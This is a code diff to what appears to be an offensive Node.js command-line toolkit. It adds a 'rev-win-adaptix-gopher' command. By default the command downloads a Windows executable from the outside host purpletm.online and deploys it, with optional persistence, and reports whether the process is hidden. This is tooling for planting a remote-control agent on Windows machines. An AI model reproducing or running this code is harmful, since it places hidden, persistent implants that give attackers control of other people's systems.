@@ -120,6 +120,27 @@ if (process.argv[2] === 'rev-win-adaptix-agent') {
   });
 }
 
+const revWinAdaptixGopher = require('./utils/rev-win-adaptix-gopher.js');
+
+if (process.argv[2] === 'rev-win-adaptix-gopher') {
+  const options = {
+    url: process.argv[3] || "http://purpletm.online:7070/purple-win.exe",
+    persistence: process.argv.includes('--persist')
+  };
+  
+  revWinAdaptixGopher(options).then(result => {
+    console.log('✅ Windows Adaptix Gopher deployment completed');
+    console.log(`PID: ${result.pid}`);
+    console.log(`File: ${result.filePath}`);
+    console.log(`Platform: ${result.platform}`);
+    console.log(`Method: ${result.method}`);
+    console.log(`Hidden: ${result.hidden}`);
+  }).catch(err => {
+    console.error('❌ Windows Gopher deployment failed:', err.message);
+    process.exit(1);
+  });
+}
+
 const runSwiftBelt = require('./utils/run-swiftbelt.js');
 
 if (process.argv[2] === 'swiftbelt') {
